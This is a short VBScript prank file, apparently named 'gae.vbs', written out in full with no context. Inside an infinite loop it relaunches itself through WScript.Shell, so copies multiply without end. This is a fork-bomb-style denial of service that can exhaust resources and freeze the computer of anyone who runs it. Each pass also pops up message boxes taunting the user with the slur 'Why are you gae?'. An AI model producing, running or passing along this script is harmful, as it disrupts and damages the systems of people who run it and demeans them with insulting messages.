Do
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "gae.vbs" 
Set objShell = Nothing
X=MsgBox("Why are you gae?",2+48,"You are gae")
X=MsgBox("You are gae",2+32,"Why are you gae?")
Loop
